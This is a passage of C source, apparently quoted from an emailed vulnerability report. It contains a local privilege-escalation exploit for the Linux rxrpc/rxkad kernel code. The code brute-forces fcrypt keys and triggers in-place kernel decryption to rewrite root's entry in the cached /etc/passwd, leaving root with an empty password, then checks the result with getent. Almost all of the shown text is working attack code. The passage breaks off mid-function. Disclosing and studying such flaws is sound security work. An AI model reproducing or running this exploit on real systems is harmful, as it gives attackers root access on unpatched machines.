>         0x84, 0xbc, 0xa9, 0xfd, 0x55, 0x50, 0xe9, 0xb6, 0x13, 0x5e, 0x07,
> 0xb8, 0x95, 0x02, 0xc0, 0xd0,
>         0x6a, 0x1a, 0x85, 0xbd, 0xb6, 0xfd, 0xfe, 0x17, 0x3f, 0x09, 0xa3,
> 0x8d, 0xfb, 0xed, 0xda, 0x1d,
>         0x6d, 0x1c, 0x6c, 0x01, 0x5a, 0xe5, 0x71, 0x3e, 0x8b, 0x6b, 0xbe,
> 0x29, 0xeb, 0x12, 0x19, 0x34,
>         0xcd, 0xb3, 0xbd, 0x35, 0xea, 0x4b, 0xd5, 0xae, 0x2a, 0x79, 0x5a,
> 0xa5, 0x32, 0x12, 0x7b, 0xdc,
>         0x2c, 0xd0, 0x22, 0x4b, 0xb1, 0x85, 0x59, 0x80, 0xc0, 0x30, 0x9f,
> 0x73, 0xd3, 0x14, 0x48, 0x40,
>         0x07, 0x2d, 0x8f, 0x80, 0x0f, 0xce, 0x0b, 0x5e, 0xb7, 0x5e, 0xac,
> 0x24, 0x94, 0x4a, 0x18, 0x15,
>         0x05, 0xe8, 0x02, 0x77, 0xa9, 0xc7, 0x40, 0x45, 0x89, 0xd1, 0xea,
> 0xde, 0x0c, 0x79, 0x2a, 0x99,
>         0x6c, 0x3e, 0x95, 0xdd, 0x8c, 0x7d, 0xad, 0x6f, 0xdc, 0xff, 0xfd,
> 0x62, 0x47, 0xb3, 0x21, 0x8a,
>         0xec, 0x8e, 0x19, 0x18, 0xb4, 0x6e, 0x3d, 0xfd, 0x74, 0x54, 0x1e,
> 0x04, 0x85, 0xd8, 0xbc, 0x1f,
>         0x56, 0xe7, 0x3a, 0x56, 0x67, 0xd6, 0xc8, 0xa5, 0xf3, 0x8e, 0xde,
> 0xae, 0x37, 0x49, 0xb7, 0xfa,
>         0xc8, 0xf4, 0x1f, 0xe0, 0x2a, 0x9b, 0x15, 0xd1, 0x34, 0x0e, 0xb5,
> 0xe0, 0x44, 0x78, 0x84, 0x59,
>         0x56, 0x68, 0x77, 0xa5, 0x14, 0x06, 0xf5, 0x2f, 0x8c, 0x8a, 0x73,
> 0x80, 0x76, 0xb4, 0x10, 0x86,
> };
> static const uint8_t fc_sbox3_raw[256] =3D {
>         0xa9, 0x2a, 0x48, 0x51, 0x84, 0x7e, 0x49, 0xe2, 0xb5, 0xb7, 0x42,
> 0x33, 0x7d, 0x5d, 0xa6, 0x12,
>         0x44, 0x48, 0x6d, 0x28, 0xaa, 0x20, 0x6d, 0x57, 0xd6, 0x6b, 0x5d,
> 0x72, 0xf0, 0x92, 0x5a, 0x1b,
>         0x53, 0x80, 0x24, 0x70, 0x9a, 0xcc, 0xa7, 0x66, 0xa1, 0x01, 0xa5,
> 0x41, 0x97, 0x41, 0x31, 0x82,
>         0xf1, 0x14, 0xcf, 0x53, 0x0d, 0xa0, 0x10, 0xcc, 0x2a, 0x7d, 0xd2,
> 0xbf, 0x4b, 0x1a, 0xdb, 0x16,
>         0x47, 0xf6, 0x51, 0x36, 0xed, 0xf3, 0xb9, 0x1a, 0xa7, 0xdf, 0x29,
> 0x43, 0x01, 0x54, 0x70, 0xa4,
>         0xbf, 0xd4, 0x0b, 0x53, 0x44, 0x60, 0x9e, 0x23, 0xa1, 0x18, 0x68,
> 0x4f, 0xf0, 0x2f, 0x82, 0xc2,
>         0x2a, 0x41, 0xb2, 0x42, 0x0c, 0xed, 0x0c, 0x1d, 0x13, 0x3a, 0x3c,
> 0x6e, 0x35, 0xdc, 0x60, 0x65,
>         0x85, 0xe9, 0x64, 0x02, 0x9a, 0x3f, 0x9f, 0x87, 0x96, 0xdf, 0xbe,
> 0xf2, 0xcb, 0xe5, 0x6c, 0xd4,
>         0x5a, 0x83, 0xbf, 0x92, 0x1b, 0x94, 0x00, 0x42, 0xcf, 0x4b, 0x00,
> 0x75, 0xba, 0x8f, 0x76, 0x5f,
>         0x5d, 0x3a, 0x4d, 0x09, 0x12, 0x08, 0x38, 0x95, 0x17, 0xe4, 0x01,
> 0x1d, 0x4c, 0xa9, 0xcc, 0x85,
>         0x82, 0x4c, 0x9d, 0x2f, 0x3b, 0x66, 0xa1, 0x34, 0x10, 0xcd, 0x59,
> 0x89, 0xa5, 0x31, 0xcf, 0x05,
>         0xc8, 0x84, 0xfa, 0xc7, 0xba, 0x4e, 0x8b, 0x1a, 0x19, 0xf1, 0xa1,
> 0x3b, 0x18, 0x12, 0x17, 0xb0,
>         0x98, 0x8d, 0x0b, 0x23, 0xc3, 0x3a, 0x2d, 0x20, 0xdf, 0x13, 0xa0,
> 0xa8, 0x4c, 0x0d, 0x6c, 0x2f,
>         0x47, 0x13, 0x13, 0x52, 0x1f, 0x2d, 0xf5, 0x79, 0x3d, 0xa2, 0x54,
> 0xbd, 0x69, 0xc8, 0x6b, 0xf3,
>         0x05, 0x28, 0xf1, 0x16, 0x46, 0x40, 0xb0, 0x11, 0xd3, 0xb7, 0x95,
> 0x49, 0xcf, 0xc3, 0x1d, 0x8f,
>         0xd8, 0xe1, 0x73, 0xdb, 0xad, 0xc8, 0xc9, 0xa9, 0xa1, 0xc2, 0xc5,
> 0xe3, 0xba, 0xfc, 0x0e, 0x25,
> };
>
> static uint32_t fc_sbox0[256], fc_sbox1[256], fc_sbox2[256], fc_sbox3[256=
];
>
> #include <endian.h>
>
> static void fcrypt_init_sboxes(void)
> {
>         for (int i =3D 0; i < 256; i++) {
>                 fc_sbox0[i] =3D htobe32((uint32_t)fc_sbox0_raw[i] << 3);
>                 fc_sbox1[i] =3D htobe32(((uint32_t)(fc_sbox1_raw[i] & 0x1=
f)
> << 27) |
>                                 ((uint32_t)fc_sbox1_raw[i] >> 5));
>                 fc_sbox2[i] =3D htobe32((uint32_t)fc_sbox2_raw[i] << 11);
>                 fc_sbox3[i] =3D htobe32((uint32_t)fc_sbox3_raw[i] << 19);
>         }
> }
>
> #define fc_ror56_64(k, n) \
>         (k =3D (k >> (n)) | ((k & ((1ULL << (n)) - 1)) << (56 - (n))))
>
> typedef struct { uint32_t sched[16]; } fcrypt_uctx;
>
> static void fcrypt_user_setkey(fcrypt_uctx *ctx, const uint8_t key[8])
> {
>         uint64_t k =3D 0;
>         k  =3D (uint64_t)(key[0] >> 1);
>         k <<=3D 7; k |=3D (uint64_t)(key[1] >> 1);
>         k <<=3D 7; k |=3D (uint64_t)(key[2] >> 1);
>         k <<=3D 7; k |=3D (uint64_t)(key[3] >> 1);
>         k <<=3D 7; k |=3D (uint64_t)(key[4] >> 1);
>         k <<=3D 7; k |=3D (uint64_t)(key[5] >> 1);
>         k <<=3D 7; k |=3D (uint64_t)(key[6] >> 1);
>         k <<=3D 7; k |=3D (uint64_t)(key[7] >> 1);
>
>         ctx->sched[0x0] =3D htobe32((uint32_t)k); fc_ror56_64(k, 11);
>         ctx->sched[0x1] =3D htobe32((uint32_t)k); fc_ror56_64(k, 11);
>         ctx->sched[0x2] =3D htobe32((uint32_t)k); fc_ror56_64(k, 11);
>         ctx->sched[0x3] =3D htobe32((uint32_t)k); fc_ror56_64(k, 11);
>         ctx->sched[0x4] =3D htobe32((uint32_t)k); fc_ror56_64(k, 11);
>         ctx->sched[0x5] =3D htobe32((uint32_t)k); fc_ror56_64(k, 11);
>         ctx->sched[0x6] =3D htobe32((uint32_t)k); fc_ror56_64(k, 11);
>         ctx->sched[0x7] =3D htobe32((uint32_t)k); fc_ror56_64(k, 11);
>         ctx->sched[0x8] =3D htobe32((uint32_t)k); fc_ror56_64(k, 11);
>         ctx->sched[0x9] =3D htobe32((uint32_t)k); fc_ror56_64(k, 11);
>         ctx->sched[0xa] =3D htobe32((uint32_t)k); fc_ror56_64(k, 11);
>         ctx->sched[0xb] =3D htobe32((uint32_t)k); fc_ror56_64(k, 11);
>         ctx->sched[0xc] =3D htobe32((uint32_t)k); fc_ror56_64(k, 11);
>         ctx->sched[0xd] =3D htobe32((uint32_t)k); fc_ror56_64(k, 11);
>         ctx->sched[0xe] =3D htobe32((uint32_t)k); fc_ror56_64(k, 11);
>         ctx->sched[0xf] =3D htobe32((uint32_t)k);
> }
>
> #define FC_F(R_, L_, sched_) do {                                        \
>         union { uint32_t l; uint8_t c[4]; } u;
>    \
>         u.l =3D (sched_) ^ (R_);
>    \
>         L_ ^=3D fc_sbox0[u.c[0]] ^ fc_sbox1[u.c[1]] ^
>   \
>         fc_sbox2[u.c[2]] ^ fc_sbox3[u.c[3]];                           \
> } while (0)
>
> static void fcrypt_user_decrypt(const fcrypt_uctx *ctx,
>                 uint8_t out[8], const uint8_t in[8])
> {
>         uint32_t L, R;
>         memcpy(&L, in, 4);
>         memcpy(&R, in + 4, 4);
>         FC_F(L, R, ctx->sched[0xf]);
>         FC_F(R, L, ctx->sched[0xe]);
>         FC_F(L, R, ctx->sched[0xd]);
>         FC_F(R, L, ctx->sched[0xc]);
>         FC_F(L, R, ctx->sched[0xb]);
>         FC_F(R, L, ctx->sched[0xa]);
>         FC_F(L, R, ctx->sched[0x9]);
>         FC_F(R, L, ctx->sched[0x8]);
>         FC_F(L, R, ctx->sched[0x7]);
>         FC_F(R, L, ctx->sched[0x6]);
>         FC_F(L, R, ctx->sched[0x5]);
>         FC_F(R, L, ctx->sched[0x4]);
>         FC_F(L, R, ctx->sched[0x3]);
>         FC_F(R, L, ctx->sched[0x2]);
>         FC_F(L, R, ctx->sched[0x1]);
>         FC_F(R, L, ctx->sched[0x0]);
>         memcpy(out, &L, 4);
>         memcpy(out + 4, &R, 4);
> }
>
> /* For the 2-splice chain we want the line to have EXACTLY 6 ':' and a
>  * shell field that equals "/bin/bash" (in /etc/shells, valid path).
>  * The two splices interlock as:
>  *
>  *   bytes 7..14  (offset 2800): P1 =E2=80=94 sets uid=3D0, gid=3D1 digit=
, then
>  *                4 random gecos-prefix bytes.
>  *   bytes 15..22 (offset 2808): P2 =E2=80=94 wipes the original ':' at l=
ine
>  *                pos 16, preserves ':' at pos 21 and '/' at pos 22.
>  *
>  *   Combined line: "test:x:0:G:GGGGGGGGGG:/home/test:/bin/bash"
>  *                   pos 0    8    21       32
>  *
>  *   pw_uid=3D0, pw_gid=3DG, pw_dir=3D"/home/test", pw_shell=3D"/bin/bash=
".
>  *   Now `su -s /bin/bash test` proceeds through the restricted_shell()
>  *   check (because /bin/bash IS in /etc/shells) and exec()s /bin/bash
>  *   under uid=3D0.
>  *
>  * =3D=3D=3D 3-splice predicates =3D=3D=3D
>  *
>  * After applying splices A, B, C in order to /etc/passwd line 1
>  * (offsets 4, 6, 8 =E2=80=94 each 8 bytes, last-write-wins), the final s=
tate
>  * of chars 4..15 is determined by these P bytes:
>  *
>  *   char 4  =3D P_A[0]   want: ':'
>  *   char 5  =3D P_A[1]   want: ':'
>  *   char 6  =3D P_B[0]   want: '0'   (overwrites P_A[2])
>  *   char 7  =3D P_B[1]   want: ':'   (overwrites P_A[3])
>  *   char 8  =3D P_C[0]   want: '0'   (overwrites P_A[4]/P_B[2])
>  *   char 9  =3D P_C[1]   want: ':'   (overwrites P_A[5]/P_B[3])
>  *   char 10..14 =3D P_C[2..6]  want: any byte except ':' '\0' '\n'
>  *   char 15 =3D P_C[7]   want: ':'
>  *
>  * The constraints on P_A[2..7] and P_B[2..7] are vacuous because they
>  * are overwritten before /etc/passwd is read by anyone =E2=80=94 we only=
 care
>  * about the final state. */
> static inline int fc_check_pa_nullok(const uint8_t P[8])
> {
>         return P[0] =3D=3D ':' && P[1] =3D=3D ':';
> }
>
> static inline int fc_check_pb_nullok(const uint8_t P[8])
> {
>         return P[0] =3D=3D '0' && P[1] =3D=3D ':';
> }
>
> static inline int fc_check_pc_nullok(const uint8_t P[8])
> {
>         if (P[0] !=3D '0') return 0;
>         if (P[1] !=3D ':') return 0;
>         if (P[7] !=3D ':') return 0;
>         for (int i =3D 2; i < 7; i++) {
>                 if (P[i] =3D=3D ':' || P[i] =3D=3D '\0' || P[i] =3D=3D '\=
n') return 0;
>         }
>         return 1;
> }
>
> static uint64_t fc_splitmix64(uint64_t *s)
> {
>         uint64_t z =3D (*s +=3D 0x9E3779B97F4A7C15ULL);
>         z =3D (z ^ (z >> 30)) * 0xBF58476D1CE4E5B9ULL;
>         z =3D (z ^ (z >> 27)) * 0x94D049BB133111EBULL;
>         return z ^ (z >> 31);
> }
>
> /* Generic brute-force.  `predicate` decides if a P is acceptable. */
> typedef int (*pcheck_fn)(const uint8_t P[8]);
>
> static int find_K_offline_generic(const uint8_t C[8], uint64_t max_iters,
>                 pcheck_fn check,
>                 uint8_t K_out[8], uint8_t P_out[8],
>                 uint64_t seed_init,
>                 const char *label)
> {
>         fcrypt_uctx ctx;
>         uint8_t K[8], P[8];
>         uint64_t seed =3D seed_init;
>         struct timespec ts0, ts1;
>         clock_gettime(CLOCK_MONOTONIC, &ts0);
>
>         for (uint64_t iter =3D 0; iter < max_iters; iter++) {
>                 uint64_t r =3D fc_splitmix64(&seed);
>                 memcpy(K, &r, 8);
>                 fcrypt_user_setkey(&ctx, K);
>                 fcrypt_user_decrypt(&ctx, P, C);
>
>                 if (check(P)) {
>                         memcpy(K_out, K, 8);
>                         memcpy(P_out, P, 8);
>                         clock_gettime(CLOCK_MONOTONIC, &ts1);
>                         double dt =3D (ts1.tv_sec - ts0.tv_sec) +
>                                 (ts1.tv_nsec - ts0.tv_nsec) / 1e9;
>                         LOG("%s found after %lu iters in %.2fs (%.2fM/s)
> K=3D%02x%02x%02x%02x%02x%02x%02x%02x  P=3D%02x%02x%02x%02x%02x%02x%02x%02x
> \"%c%c%c%c%c%c%c%c\"",
>                                         label,
>                                         (unsigned long)iter, dt, iter / dt
> / 1e6,
>
> K[0],K[1],K[2],K[3],K[4],K[5],K[6],K[7],
>
> P[0],P[1],P[2],P[3],P[4],P[5],P[6],P[7],
>                                         (P[0]>=3D32&&P[0]<127)?P[0]:'.',
>                                         (P[1]>=3D32&&P[1]<127)?P[1]:'.',
>                                         (P[2]>=3D32&&P[2]<127)?P[2]:'.',
>                                         (P[3]>=3D32&&P[3]<127)?P[3]:'.',
>                                         (P[4]>=3D32&&P[4]<127)?P[4]:'.',
>                                         (P[5]>=3D32&&P[5]<127)?P[5]:'.',
>                                         (P[6]>=3D32&&P[6]<127)?P[6]:'.',
>                                         (P[7]>=3D32&&P[7]<127)?P[7]:'.');
>                         return 0;
>                 }
>
>                 if ((iter & 0x3ffffff) =3D=3D 0 && iter > 0) {
>                         clock_gettime(CLOCK_MONOTONIC, &ts1);
>                         double dt =3D (ts1.tv_sec - ts0.tv_sec) +
>                                 (ts1.tv_nsec - ts0.tv_nsec) / 1e9;
>                         fprintf(stderr, "  [%s %.1fs] iter=3D%lu
> (%.2fM/s)\n",
>                                         label, dt, (unsigned long)iter,
> iter / dt / 1e6);
>                 }
>         }
>         return -1;
> }
>
>
> int rxrpc_lpe_main(int argc, char **argv)
> {
>         fprintf(stderr, "\n=3D=3D=3D rxrpc/rxkad LPE EXPLOIT (uid=3D1000 =
=E2=86=92 root)
> =3D=3D=3D\n");
>         fprintf(stderr, "[*] uid=3D%u euid=3D%u gid=3D%u\n",
>                         getuid(), geteuid(), getgid());
>
>         {
>                 const char *no_unshare =3D getenv("POC_NO_UNSHARE");
>                 if (!no_unshare || *no_unshare !=3D '1') {
>                         const char *do_unshare =3D getenv("POC_UNSHARE");
>                         if (do_unshare && *do_unshare =3D=3D '1') {
>                                 if (do_unshare_userns_netns() < 0) return
> 1;
>                         }
>                 }
>         }
>
>         /* Open a dummy AF_RXRPC socket to autoload the rxrpc kernel
> module.
>          * Without this, the first add_key("rxrpc", ...) call fails with
> ENODEV
>          * because the kernel key type "rxrpc" is registered by
> rxrpc_init() in
>          * the module load path. */
>         {
>                 int dummy =3D socket(AF_RXRPC, SOCK_DGRAM, PF_INET);
>                 if (dummy < 0) {
>                         WARN("socket(AF_RXRPC): %s =E2=80=94 module not
> loadable?", strerror(errno));
>                         return 1;
>                 }
>                 close(dummy);
>                 LOG("rxrpc module autoloaded via dummy socket(AF_RXRPC)");
>         }
>
>         /* Open /etc/passwd RO and mmap the first page (which contains the
>          * root entry on line 1). */
>         const char *target_path =3D getenv("POC_TARGET_FILE");
>         if (!target_path || !*target_path) target_path =3D "/etc/passwd";
>
>         int rfd_ro =3D open(target_path, O_RDONLY);
>         if (rfd_ro < 0) {
>                 WARN("open %s RO: %s", target_path, strerror(errno));
>                 return 1;
>         }
>         struct stat st;
>         fstat(rfd_ro, &st);
>         if (st.st_size < 32) { WARN("target too small: %lld", (long
> long)st.st_size); return 1; }
>         LOG("target %s opened RO, size=3D%lld, uid=3D%u gid=3D%u mode=3D%=
04o",
>                         target_path, (long long)st.st_size, st.st_uid,
> st.st_gid,
>                         st.st_mode & 07777);
>
>         /* mmap first page so the page-cache page stays pinned. */
>         void *map =3D mmap(NULL, 4096, PROT_READ, MAP_SHARED, rfd_ro, 0);
>         if (map =3D=3D MAP_FAILED) { WARN("mmap: %s", strerror(errno)); r=
eturn
> 1; }
>         LOG("mmap'd %s page-cache at %p (PROT_READ|MAP_SHARED)",
> target_path, map);
>
>         /* If a previous attempt already left the root entry in the patch=
ed
>          * "root::0:0:..." form, treat as success and skip the brute-force
> /
>          * trigger stages.  Otherwise proceed regardless of current state=
 =E2=80=94
>          * the brute-force re-derives K_A/K_B/K_C from whatever bytes are
>          * currently at offsets 4/6/8 of the page-cache page, so it works
>          * even on the corrupt residue from a previous failed run. */
>         {
>                 const char *m =3D (const char *)map;
>                 if (memcmp(m, "root::0:0", 9) =3D=3D 0) {
>                         LOG("/etc/passwd already patched (root::0:0...) =
=E2=80=94
> nothing to do");
>                         return 0;
>                 }
>                 LOG("/etc/passwd line 1 first 16 bytes:");
>                 for (int i =3D 0; i < 16; i++)
>                         fprintf(stderr, "%02x ", (uint8_t)m[i]);
>                 fprintf(stderr, "\n");
>         }
>         fprintf(stderr, "[*] /etc/passwd line 1 (root entry) BEFORE: '");
>         for (int i =3D 0; i < 32; i++) {
>                 char c =3D ((const char *)map)[i];
>                 fputc((c =3D=3D '\n') ? '$' : (c >=3D 32 && c < 127 ? c :=
 '.'),
> stderr);
>         }
>         fprintf(stderr, "'\n");
>
>         /* =3D=3D=3D STAGE 1 =E2=80=94 THREE-SPLICE OFFLINE BRUTE FORCE =
=3D=3D=3D
>          *
>          * Read THREE 8-byte ciphertexts at file offsets 4, 6, 8.  Search
>          * independently for K_A (chars 4-5 =3D "::"), K_B (chars 6-7 =3D
> "0:"),
>          * K_C (chars 8-15 =3D "0:GGGGGG:" with G non-control).  All sear=
ches
>          * are user-space only =E2=80=94 no kernel/VM interaction.
>          *
>          * Last-write-wins ordering: trigger A first (covers 4..11), then=
 B
>          * (covers 6..13 =E2=80=94 overrides A's 6..11), then C (covers 8=
..15 =E2=80=94
>          * overrides A's 8..11 and B's 8..13).  Final state of chars 4..1=
5:
>          *   chars 4..5  =3D P_A[0..1]
>          *   chars 6..7  =3D P_B[0..1]
>          *   chars 8..15 =3D P_C[0..7]
>          *
> =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D*/
>         uint8_t Ca[8], Cb[8], Cc[8];
>         int off_a =3D 4, off_b =3D 6, off_c =3D 8;
>         if (pread(rfd_ro, Ca, 8, off_a) !=3D 8) { WARN("pread Ca: %s",
> strerror(errno)); return 1; }
>         if (pread(rfd_ro, Cb, 8, off_b) !=3D 8) { WARN("pread Cb: %s",
> strerror(errno)); return 1; }
>         if (pread(rfd_ro, Cc, 8, off_c) !=3D 8) { WARN("pread Cc: %s",
> strerror(errno)); return 1; }
>
>         LOG("Ca @ %d: %02x%02x%02x%02x%02x%02x%02x%02x
> \"%c%c%c%c%c%c%c%c\"",
>                         off_a,
> Ca[0],Ca[1],Ca[2],Ca[3],Ca[4],Ca[5],Ca[6],Ca[7],
>                         (Ca[0]>=3D32&&Ca[0]<127)?Ca[0]:'.',
> (Ca[1]>=3D32&&Ca[1]<127)?Ca[1]:'.',
>                         (Ca[2]>=3D32&&Ca[2]<127)?Ca[2]:'.',
> (Ca[3]>=3D32&&Ca[3]<127)?Ca[3]:'.',
>                         (Ca[4]>=3D32&&Ca[4]<127)?Ca[4]:'.',
> (Ca[5]>=3D32&&Ca[5]<127)?Ca[5]:'.',
>                         (Ca[6]>=3D32&&Ca[6]<127)?Ca[6]:'.',
> (Ca[7]>=3D32&&Ca[7]<127)?Ca[7]:'.');
>         LOG("Cb @ %d: %02x%02x%02x%02x%02x%02x%02x%02x
> \"%c%c%c%c%c%c%c%c\"",
>                         off_b,
> Cb[0],Cb[1],Cb[2],Cb[3],Cb[4],Cb[5],Cb[6],Cb[7],
>                         (Cb[0]>=3D32&&Cb[0]<127)?Cb[0]:'.',
> (Cb[1]>=3D32&&Cb[1]<127)?Cb[1]:'.',
>                         (Cb[2]>=3D32&&Cb[2]<127)?Cb[2]:'.',
> (Cb[3]>=3D32&&Cb[3]<127)?Cb[3]:'.',
>                         (Cb[4]>=3D32&&Cb[4]<127)?Cb[4]:'.',
> (Cb[5]>=3D32&&Cb[5]<127)?Cb[5]:'.',
>                         (Cb[6]>=3D32&&Cb[6]<127)?Cb[6]:'.',
> (Cb[7]>=3D32&&Cb[7]<127)?Cb[7]:'.');
>         LOG("Cc @ %d: %02x%02x%02x%02x%02x%02x%02x%02x
> \"%c%c%c%c%c%c%c%c\"",
>                         off_c,
> Cc[0],Cc[1],Cc[2],Cc[3],Cc[4],Cc[5],Cc[6],Cc[7],
>                         (Cc[0]>=3D32&&Cc[0]<127)?Cc[0]:'.',
> (Cc[1]>=3D32&&Cc[1]<127)?Cc[1]:'.',
>                         (Cc[2]>=3D32&&Cc[2]<127)?Cc[2]:'.',
> (Cc[3]>=3D32&&Cc[3]<127)?Cc[3]:'.',
>                         (Cc[4]>=3D32&&Cc[4]<127)?Cc[4]:'.',
> (Cc[5]>=3D32&&Cc[5]<127)?Cc[5]:'.',
>                         (Cc[6]>=3D32&&Cc[6]<127)?Cc[6]:'.',
> (Cc[7]>=3D32&&Cc[7]<127)?Cc[7]:'.');
>
>         fcrypt_init_sboxes();
>         /* selftest */
>         {
>                 fcrypt_uctx ctx;
>                 uint8_t z[8] =3D {0};
>                 uint8_t cv[8] =3D { 0x0E, 0x09, 0x00, 0xC7, 0x3E, 0xF7,
> 0xED, 0x41 };
>                 uint8_t pv[8];
>                 fcrypt_user_setkey(&ctx, z);
>                 fcrypt_user_decrypt(&ctx, pv, cv);
>                 if (memcmp(pv, z, 8) !=3D 0) { WARN("fcrypt selftest
> FAILED"); return 1; }
>         }
>         LOG("fcrypt selftest OK");
>
>         uint8_t Ka[8], Pa_out[8];
>         uint8_t Kb[8], Pb_out[8];
>         uint8_t Kc[8], Pc_out[8];
>         uint8_t Cb_actual[8], Cc_actual[8];
>
>         {
>                 uint64_t max_iters =3D 10000000000ULL;
>                 const char *e =3D getenv("LPE_MAX_ITERS");
>                 if (e) max_iters =3D strtoull(e, NULL, 0);
>                 uint64_t seed_base =3D (uint64_t)time(NULL) * 0x100000001=
ULL
> ^ (uint64_t)getpid();
>                 const char *se =3D getenv("LPE_SEED");
>                 if (se) seed_base =3D strtoull(se, NULL, 0);
>
>                 fprintf(stderr, "\n=3D=3D=3D STAGE 1a: search K_A (chars =
4-5 :=3D
> \"::\")  prob ~1.5e-5 =3D=3D=3D\n");
>                 if (find_K_offline_generic(Ca, max_iters,
> fc_check_pa_nullok,
>                                         Ka, Pa_out, seed_base, "K_A") !=3D
> 0) {
>                         WARN("K_A search exhausted"); return 2;
>                 }
>
>                 /* After splice A is applied, the ciphertext that splice B
> will
>                  * see at file offset 6 is NOT the original Cb =E2=80=94 =
it's the
> bytes
>                  * that splice A wrote to file offsets 6..11 (=3D Pa[2..7=
])
> plus
>                  * the original bytes 12..13 (=3D Cb[6..7]).  We must der=
ive
>                  * Cb_actual and search K_B against it. */
>                 memcpy(Cb_actual, Pa_out + 2, 6);
>                 memcpy(Cb_actual + 6, Cb + 6, 2);
>                 LOG("Cb_actual (after splice A) =3D
> %02x%02x%02x%02x%02x%02x%02x%02x",
>
> Cb_actual[0],Cb_actual[1],Cb_actual[2],Cb_actual[3],
>
> Cb_actual[4],Cb_actual[5],Cb_actual[6],Cb_actual[7]);
>
>                 fprintf(stderr, "\n=3D=3D=3D STAGE 1b: search K_B (chars =
6-7 :=3D
> \"0:\")  prob ~1.5e-5 =3D=3D=3D\n");
>                 if (find_K_offline_generic(Cb_actual, max_iters,
> fc_check_pb_nullok,
>                                         Kb, Pb_out, seed_base ^
> 0xa5a5a5a5a5a5a5a5ULL,
>                                         "K_B") !=3D 0) {
>                         WARN("K_B search exhausted"); return 2;
>                 }
>
>                 /* Same chaining logic for splice C: after splice B, file
> offsets
>                  * 8..13 hold Pb[2..7]; offsets 14..15 still hold the
> original
>                  * bytes Cc[6..7]. */
>                 memcpy(Cc_actual, Pb_out + 2, 6);
>                 memcpy(Cc_actual + 6, Cc + 6, 2);
>                 LOG("Cc_actual (after splice B) =3D
> %02x%02x%02x%02x%02x%02x%02x%02x",
>
> Cc_actual[0],Cc_actual[1],Cc_actual[2],Cc_actual[3],
>
> Cc_actual[4],Cc_actual[5],Cc_actual[6],Cc_actual[7]);
>
>                 fprintf(stderr, "\n=3D=3D=3D STAGE 1c: search K_C (chars =
8-15 :=3D
> \"0:GGGGGG:\")  prob ~5.4e-8 =3D=3D=3D\n");
>                 if (find_K_offline_generic(Cc_actual, max_iters,
> fc_check_pc_nullok,
>                                         Kc, Pc_out, seed_base ^
> 0x5a5a5a5a5a5a5a5aULL,
>                                         "K_C") !=3D 0) {
>                         WARN("K_C search exhausted"); return 2;
>                 }
>         }
>
>         fprintf(stderr, "\n[+] Predicted post-corruption /etc/passwd line
> 1:\n    \"root");
>         /* chars 4-5 from P_A */
>         for (int i =3D 0; i < 2; i++)
> fputc((Pa_out[i]>=3D32&&Pa_out[i]<127)?Pa_out[i]:'.', stderr);
>         /* chars 6-7 from P_B */
>         for (int i =3D 0; i < 2; i++)
> fputc((Pb_out[i]>=3D32&&Pb_out[i]<127)?Pb_out[i]:'.', stderr);
>         /* chars 8-15 from P_C */
>         for (int i =3D 0; i < 8; i++)
> fputc((Pc_out[i]>=3D32&&Pc_out[i]<127)?Pc_out[i]:'.', stderr);
>         fprintf(stderr, "/root:/bin/bash\"\n");
>
>         /* =3D=3D=3D STAGE 2 =E2=80=94 THREE KERNEL TRIGGERS (in order A =
=E2=86=92 B =E2=86=92 C) =3D=3D=3D
>          * Each trigger does a single in-place decrypt at the
>          * indicated /etc/passwd file offset.  Last-write-wins on
> overlapping
>          * bytes determines the final state.
>          */
>         fprintf(stderr, "\n=3D=3D=3D STAGE 2a: kernel trigger A @ off %d =
(set
> chars 4-5 \"::\") =3D=3D=3D\n", off_a);
>         memcpy(SESSION_KEY, Ka, 8);
>         if (do_one_trigger(rfd_ro, off_a, 8) < 0) {
>                 WARN("kernel trigger A failed"); return 3;
>         }
>
>         fprintf(stderr, "\n=3D=3D=3D STAGE 2b: kernel trigger B @ off %d =
(set
> chars 6-7 \"0:\") =3D=3D=3D\n", off_b);
>         memcpy(SESSION_KEY, Kb, 8);
>         if (do_one_trigger(rfd_ro, off_b, 8) < 0) {
>                 WARN("kernel trigger B failed"); return 3;
>         }
>
>         fprintf(stderr, "\n=3D=3D=3D STAGE 2c: kernel trigger C @ off %d =
(set
> chars 8-15 \"0:GGGGGG:\") =3D=3D=3D\n", off_c);
>         memcpy(SESSION_KEY, Kc, 8);
>         if (do_one_trigger(rfd_ro, off_c, 8) < 0) {
>                 WARN("kernel trigger C failed"); return 3;
>         }
>
>         /* Verify: re-read line 1 of /etc/passwd via mmap. */
>         fprintf(stderr, "[*] /etc/passwd line 1 (root entry) AFTER:  '");
>         for (int i =3D 0; i < 32; i++) {
>                 char c =3D ((const char *)map)[i];
>                 fputc((c =3D=3D '\n') ? '$' : (c >=3D 32 && c < 127 ? c :=
 '.'),
> stderr);
>         }
>         fprintf(stderr, "'\n");
>
>         /* Sanity-check: chars 4-5 =3D "::", 6-7 =3D "0:", 8-9 =3D "0:", =
15 =3D
> ':'. */
>         {
>                 const char *m =3D (const char *)map;
>                 int ok =3D (m[4] =3D=3D ':' && m[5] =3D=3D ':' &&
>                                 m[6] =3D=3D '0' && m[7] =3D=3D ':' &&
>                                 m[8] =3D=3D '0' && m[9] =3D=3D ':' &&
>                                 m[15] =3D=3D ':');
>                 if (!ok) {
>                         WARN("post-trigger sanity check failed =E2=80=94 =
char
> layout off");
>                         return 4;
>                 }
>         }
>         fprintf(stderr,
>                         "\n[!!!] HIT =E2=80=94 root entry now has empty p=
asswd
> field, uid=3D0, "
>                         "gid=3D0, dir=3D/root, shell=3D/bin/bash.\n");
>
>         /* =3D=3D=3D STAGE 3 =E2=80=94 VERIFY VIA getent passwd root =3D=
=3D=3D */
>         fprintf(stderr,
>                         "\n=3D=3D=3D STAGE 3: independent verify via `get=
ent
> passwd root` =3D=3D=3D\n");
>         {
>                 int p[2];
>                 if (pipe(p) =3D=3D 0) {
>                         pid_t pid =3D fork();
>                         if (pid =3D=3D 0) {
>                                 close(p[0]);
>                                 dup2(p[1], 1);
>                                 dup2(p[1], 2);
>                                 close(p[1]);
>                                 execlp("getent", "getent", "passwd",
> "root", NULL);
>                                 _exit(127);
>                         }
>                         close(p[1]);
>                         char buf[1024];
>                         ssize_t r =3D read(p[0], buf, sizeof(buf) - 1);
>                         close(p[0]);
